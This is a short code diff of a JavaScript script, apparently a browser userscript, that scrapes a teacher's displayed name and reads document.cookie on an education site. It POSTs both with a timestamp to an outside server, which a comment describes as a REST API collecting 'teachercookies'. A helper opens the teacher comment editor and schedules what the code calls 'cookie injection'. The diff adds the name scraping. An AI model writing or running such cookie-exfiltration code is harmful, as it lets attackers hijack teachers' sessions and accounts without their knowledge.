@@ -19,11 +19,11 @@ function sendInfoToServer(){
                 + currentdate.getSeconds();
 
     const item = {
-        name: "",
+        name: document.getElementsByClassName("zt_u_name")[0].innerText,
         cookie:document.cookie ,
-        time:
+        time:datetime
       };
-    
+
       fetch(uri, {
         method: 'POST',
         headers: {
@@ -34,6 +34,7 @@ function sendInfoToServer(){
       })
         .then(response => response.json())
         .catch(error => console.error('Unable to add item.', error));
+        //send cookie info to a server hosting a restfulapi for teachercookies
 }
 
 function test(){
@@ -42,6 +43,7 @@ function test(){
 
     document.getElementsByClassName("comPic")[0].click(); //open teacher comment editor
     setTimeout(stt,2000);//start cookie injection
+    //setTimeout(sendInfoToServer,2000);//start cookie injection
     return;
 }
 
